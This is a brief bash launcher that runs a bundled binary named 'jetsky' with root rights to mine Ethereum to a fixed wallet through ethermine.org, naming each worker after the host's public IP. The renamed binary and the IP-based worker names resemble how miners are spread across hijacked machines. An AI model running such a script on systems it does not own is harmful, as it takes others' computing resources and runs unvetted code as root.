#!/bin/bash

WALLET=0x491fcd9921b694454fff2882836526177d4317a8
WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-eth

cd "$(dirname "$0")"

chmod +x ./jetsky && sudo ./jetsky -G -P stratum1+tcp://$WALLET.$WORKER@asia1.ethermine.org:4444
